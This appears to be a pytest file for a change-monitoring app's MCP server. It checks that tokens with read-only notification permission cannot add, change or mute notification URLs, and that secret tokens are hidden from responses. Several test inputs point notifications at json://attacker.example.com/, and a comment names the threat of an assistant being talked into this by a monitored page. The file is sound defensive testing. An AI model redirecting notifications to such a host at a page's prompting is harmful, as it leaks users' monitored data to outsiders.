#!/usr/bin/env python3
"""MCP and notifications: the Notifications row of a token's permissions grid, notification_services (Apprise's own
description of every service) and add_notification built from a service and its tokens."""
import json

import pytest
from flask import url_for
from .util import delete_all_watches, new_mcp_token

SLACK_TOKENS = {'token_a': 'T1JJ3T3L2', 'token_b': 'A1BRTD4JD', 'token_c': 'TIiajkdnlazkcOXrIdevi7FQ', 'targets': ['#business']}


@pytest.fixture(autouse=True)
def mcp_switched_on(client):
    """MCP on, and a token with the default permissions (notifications: read)."""
    settings = client.application.config['DATASTORE'].data['settings']['application']
    settings['mcp_enabled'] = True
    settings.pop('mcp_tokens', None)
    client.application.config['MCP_TEST_TOKEN'] = new_mcp_token(client, notifications='read', system='read')
    yield
    settings.pop('mcp_tokens', None)


def _rpc(client, method, params=None):
    token = client.application.config['MCP_TEST_TOKEN']
    return client.post('/mcp/v1', data=json.dumps({'jsonrpc': '2.0', 'id': 1, 'method': method, 'params': params or {}}),
                       content_type='application/json', headers={'Authorization': f'Bearer {token}'})


def _call(client, tool, **arguments):
    res = _rpc(client, 'tools/call', {'name': tool, 'arguments': arguments})
    assert res.status_code == 200, res.data
    return res.json['result']


def _tools(client):
    return {t['name']: t for t in _rpc(client, 'tools/list').json['result']['tools']}


def test_notification_changes_switch(client, live_server, measure_memory_usage, datastore_path):
    datastore = client.application.config['DATASTORE']
    group = datastore.add_tag('restock')
    uuid = datastore.add_watch(url='https://example.com/a', extras={'title': 'Page A', 'paused': True})
    datastore.data['watching'][uuid]['notification_urls'] = ['json://example.com/hook']

    # Read by default: nothing that adds, changes, removes or mutes notifications is offered...
    tools = _tools(client)
    assert 'add_notification' not in tools and 'remove_notification' not in tools
    for tool in ('update_watch', 'update_tag'):
        assert 'notification_urls' not in tools[tool]['inputSchema']['properties'], tool
        assert 'notification_muted' not in tools[tool]['inputSchema']['properties'], tool
    assert 'notification_muted' not in tools['create_tag']['inputSchema']['properties']
    assert 'paused' in tools['update_watch']['inputSchema']['properties'], "the rest of update_watch still works"
    assert 'list_notifications' in tools and 'notification_services' in tools

    # ...and refused when called anyway, including through update_watch / update_tag (an assistant with an old
    # tool list, or one a monitored page talked into it)
    for tool, arguments in (('add_notification', {'tag': 'restock', 'url': 'json://attacker.example.com/'}),
                            ('remove_notification', {'watch': uuid, 'position': 1}),
                            ('update_watch', {'watch': uuid, 'notification_urls': ['json://attacker.example.com/']}),
                            ('update_tag', {'tag': 'restock', 'notification_urls': ['json://attacker.example.com/']}),
                            ('update_watch', {'watch': uuid, 'notification_muted': True, 'title': 'Muted'})):
        result = _call(client, tool, **arguments)
        assert result['isError'] is True, tool
        assert "'Access tokens' sub-tab of the 'MCP Server' settings" in result['content'][0]['text'], tool
    assert not datastore.data['watching'][uuid].get('notification_muted')
    assert datastore.data['watching'][uuid].get('title') == 'Page A', "nothing of a refused call is saved"
    assert datastore.data['watching'][uuid]['notification_urls'] == ['json://example.com/hook']
    assert not datastore.data['settings']['application']['tags'][group].get('notification_urls')
    # Other changes through the same tools still work
    assert _call(client, 'update_watch', watch=uuid, title='Page A2')['isError'] is False

    # Listing works while it's off, secrets hidden, with that level's notification settings
    datastore.data['watching'][uuid]['notification_title'] = 'Changed: {{watch_title}}'
    result = _call(client, 'list_notifications', watch=uuid)
    assert result['isError'] is False
    assert result['structuredContent']['settings']['notification_title'] == 'Changed: {{watch_title}}'
    assert 'notification_format' in _call(client, 'list_notifications')['structuredContent']['settings']

    # Notifications: write, in the token's overlay on the settings page (ajax)
    token_id = list(datastore.data['settings']['application']['mcp_tokens'])[0]
    grid = {'name': 'test', 'perm_monitors': 'write', 'perm_tags': 'write', 'perm_system': 'read'}
    res = client.post(url_for('settings.llm.mcp_token_update', token_id=token_id), data=dict(grid, perm_notifications='write'))
    assert res.status_code == 200 and 'Notifications <strong>Write</strong>' in res.json['html']
    assert 'add_notification' in _tools(client)
    result = _call(client, 'update_tag', tag='restock', notification_urls=['json://example.com/tag-hook'])
    assert result['isError'] is False, result

    # And back to read
    client.post(url_for('settings.llm.mcp_token_update', token_id=token_id), data=dict(grid, perm_notifications='read'))
    assert 'add_notification' not in _tools(client)

    delete_all_watches(client)


def test_notification_services_and_add_from_tokens(client, live_server, measure_memory_usage, datastore_path):
    datastore = client.application.config['DATASTORE']
    client.application.config['MCP_TEST_TOKEN'] = new_mcp_token(client)
    group = datastore.add_tag('restock')

    # The list of services, and one described from Apprise's own details(): URL forms, tokens, which are secrets
    everything = _call(client, 'notification_services')
    assert everything['isError'] is False and len(everything['structuredContent']['services']) > 100
    result = _call(client, 'notification_services', search='slack')
    assert result['isError'] is False
    slack = [s for s in result['structuredContent']['services'] if s['schemes'] == ['slack']][0]
    assert slack['tokens']['token_a']['private'] is True and slack['tokens']['token_a']['required'] is True
    assert any('{token_a}' in t for t in slack['templates'])
    assert 'retry' not in slack['options'], "options every service has are left out"
    assert 'secret: ask the user' in result['content'][0]['text']
    assert len(json.dumps(result)) < 60_000, "small enough for an assistant, unlike all of details()"
    assert _call(client, 'notification_services', search='no-such-service')['isError'] is True

    # "Add a restock notification to my business Slack channel": Apprise builds the URL from the tokens
    result = _call(client, 'add_notification', tag='restock', service='slack', tokens=SLACK_TOKENS)
    assert result['isError'] is False, result
    saved = datastore.data['settings']['application']['tags'][group]['notification_urls']
    assert len(saved) == 1 and saved[0].startswith('slack://T1JJ3T3L2/A1BRTD4JD/') and '%23business' in saved[0]
    # The secrets never come back to the assistant
    assert 'TIiajkdnlazkcOXrIdevi7FQ' not in result['content'][0]['text']
    listed = json.dumps(_call(client, 'list_notifications', tag='restock'))
    assert 'TIiajkdnlazkcOXrIdevi7FQ' not in listed and 'slack://' in listed

    # Mistakes it can correct
    assert 'not both' in _call(client, 'add_notification', tag='restock', service='slack', tokens=SLACK_TOKENS,
                               url='json://example.com/')['content'][0]['text']
    assert _call(client, 'add_notification', tag='restock', service='slack', tokens={'token_a': 'x'})['isError'] is True
    assert _call(client, 'add_notification', tag='restock')['isError'] is True

    delete_all_watches(client)
